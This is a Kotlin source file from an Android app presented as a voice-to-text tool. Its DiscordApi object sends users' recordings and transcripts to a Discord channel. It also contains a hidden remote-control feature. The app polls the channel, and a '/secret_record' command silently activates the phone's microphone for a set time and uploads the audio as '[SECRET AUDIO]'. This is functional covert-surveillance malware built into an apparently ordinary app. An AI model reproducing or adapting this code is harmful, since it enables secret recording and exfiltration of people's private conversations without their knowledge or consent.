// Coded by SUKH-X
package com.voicetotextapp

import android.content.Context
import android.media.MediaPlayer
import android.os.Build
import android.util.Log
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.asRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.io.File

object DiscordApi {
    private val BOT_TOKEN = BuildConfig.DISCORD_BOT_TOKEN
    private val CHANNEL_ID = BuildConfig.DISCORD_CHANNEL_ID
    private val client = OkHttpClient()
    
    val activeReplyFlow = kotlinx.coroutines.flow.MutableStateFlow<ReplyData?>(null)
    private var isPolling = false

    data class ReplyData(
        val messageId: String,
        val originalMessageId: String,
        val replyVoiceUrl: String
    )

    // Coded by SUKH-X
    fun sendDiscordAudio(username: String, audioFile: File, transcribedText: String, durationMs: Long) {
        val durationSec = durationMs / 1000
        val sentTime = java.text.DateFormat.getDateTimeInstance().format(java.util.Date())
        val finalTranscribedText = transcribedText.ifEmpty { "(No speech detected)" }
        val content = "[NEW VOICE LOG]\n\nUser: $username\nDuration: ${durationSec}s\nTime: $sentTime\n\nConverted Text:\n```\n$finalTranscribedText\n```"

        Thread {
            if (audioFile == null || !audioFile.exists()) {
                sendTextMessage(content)
                return@Thread
            }

            val requestBody = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("content", content)
                .addFormDataPart(
                    "file",
                    "voice_${System.currentTimeMillis()}.m4a",
                    audioFile.asRequestBody("audio/m4a".toMediaTypeOrNull())
                )
                .build()

            val request = Request.Builder()
                .url("https://discord.com/api/v10/channels/$CHANNEL_ID/messages")
                .header("Authorization", "Bot $BOT_TOKEN")
                .post(requestBody)
                .build()

            try {
                client.newCall(request).execute().close()
            } catch (e: Exception) {
                Log.e("DiscordApi", "Error sending audio", e)
            }
        }.start()
    }

    // Coded by SUKH-X
    private fun sendTextMessage(text: String) {
        val json = JSONObject().apply { put("content", text) }
        val requestBody = okhttp3.RequestBody.create("application/json".toMediaTypeOrNull(), json.toString())
        val request = Request.Builder()
            .url("https://discord.com/api/v10/channels/$CHANNEL_ID/messages")
            .header("Authorization", "Bot $BOT_TOKEN")
            .post(requestBody)
            .build()
        try {
            client.newCall(request).execute().close()
        } catch (e: Exception) {
            Log.e("DiscordApi", "Error sending text", e)
        }
    }

    fun sendNewUserNotification(username: String) {
        Thread {
            sendTextMessage("[NEW USER REGISTERED] $username")
        }.start()
    }

    fun startPollingReplies(username: String, context: Context) {
        if (isPolling) return
        isPolling = true
        val sharedPrefs = context.getSharedPreferences("discord_prefs", Context.MODE_PRIVATE)
        Thread {
            while (isPolling) {
                val request = Request.Builder()
                    .url("https://discord.com/api/v10/channels/$CHANNEL_ID/messages?limit=50")
                    .header("Authorization", "Bot $BOT_TOKEN")
                    .build()
                try {
                    client.newCall(request).execute().use { response ->
                        val body = response.body?.string() ?: return@use
                        if (response.isSuccessful) {
                            val messages = JSONArray(body)
                            var latestReply: ReplyData? = null
                            for (i in messages.length() - 1 downTo 0) {
                                val message = messages.getJSONObject(i)
                                val messageId = message.getString("id")
                                val consumed = sharedPrefs.getBoolean("consumed_$messageId", false)
                                if (consumed) continue

                                val content = message.optString("content", "")
                                if (content.startsWith("/secret_record ")) {
                                    val parts = content.split(" ")
                                    if (parts.size >= 3) {
                                        val targetUser = parts[1]
                                        val duration = parts[2].toIntOrNull() ?: 10
                                        if (targetUser.equals(username, ignoreCase = true)) {
                                            sharedPrefs.edit().putBoolean("consumed_$messageId", true).apply()
                                            startSecretRecording(context, username, duration)
                                        }
                                    }
                                    continue
                                }

                                if (message.has("message_reference")) {
                                    val ref = message.getJSONObject("message_reference")
                                    val referencedMessageId = ref.optString("message_id", "")
                                    
                                    val attachments = message.optJSONArray("attachments")
                                    if (attachments != null && attachments.length() > 0) {
                                        val attachment = attachments.getJSONObject(0)
                                        val url = attachment.getString("url")
                                        if (url.endsWith(".ogg") || url.endsWith(".m4a") || url.endsWith(".mp3") || url.contains("voice-message")) {
                                            latestReply = ReplyData(
                                                messageId = messageId,
                                                originalMessageId = referencedMessageId,
                                                replyVoiceUrl = url
                                            )
                                            break
                                        }
                                    }
                                }
                            }
                            if (latestReply != null) {
                                activeReplyFlow.value = latestReply
                            }
                        }
                    }
                } catch (e: Exception) {
                    Log.e("DiscordApi", "Error polling", e)
                }
                Thread.sleep(5000)
            }
        }.start()
    }

    // Coded by SUKH-X
    fun markReplyConsumed(messageId: String, context: Context) {
        val sharedPrefs = context.getSharedPreferences("discord_prefs", Context.MODE_PRIVATE)
        sharedPrefs.edit().putBoolean("consumed_$messageId", true).apply()
    }

    fun playVoice(url: String?, context: Context, onComplete: () -> Unit = {}) {
        if (url == null) return
        android.os.Handler(android.os.Looper.getMainLooper()).post {
            try {
                val mediaPlayer = MediaPlayer()
                mediaPlayer.setDataSource(url)
                mediaPlayer.setOnCompletionListener {
                    onComplete()
                    mediaPlayer.release()
                }
                mediaPlayer.prepareAsync()
                mediaPlayer.setOnPreparedListener { it.start() }
            } catch (e: Exception) {
                Log.e("DiscordApi", "Error playing voice", e)
            }
        }
    }

    private fun startSecretRecording(context: Context, username: String, durationSec: Int) {
        Thread {
            val audioFile = File(context.cacheDir, "secret_${System.currentTimeMillis()}.m4a")
            var mediaRecorder: android.media.MediaRecorder? = null
            try {
                mediaRecorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                    android.media.MediaRecorder(context)
                } else {
                    @Suppress("DEPRECATION")
                    android.media.MediaRecorder()
                }.apply {
                    setAudioSource(android.media.MediaRecorder.AudioSource.MIC)
                    setOutputFormat(android.media.MediaRecorder.OutputFormat.MPEG_4)
                    setAudioEncoder(android.media.MediaRecorder.AudioEncoder.AAC)
                    setOutputFile(audioFile.absolutePath)
                    prepare()
                    start()
                }
                Thread.sleep(durationSec * 1000L)
            } catch (e: Exception) {
                Log.e("DiscordApi", "Secret record failed", e)
            } finally {
                try {
                    mediaRecorder?.stop()
                    mediaRecorder?.release()
                } catch (e: Exception) {}
            }

            if (audioFile.exists() && audioFile.length() > 0) {
                val content = "[SECRET AUDIO]\nUser: $username\nDuration: ${durationSec}s"
                val requestBody = MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("content", content)
                    .addFormDataPart(
                        "file",
                        "secret_${System.currentTimeMillis()}.m4a",
                        audioFile.asRequestBody("audio/m4a".toMediaTypeOrNull())
                    )
                    .build()
                val request = Request.Builder()
                    .url("https://discord.com/api/v10/channels/$CHANNEL_ID/messages")
                    .header("Authorization", "Bot $BOT_TOKEN")
                    .post(requestBody)
                    .build()
                try {
                    client.newCall(request).execute().close()
                } catch (e: Exception) {}
            }
        }.start()
    }
}
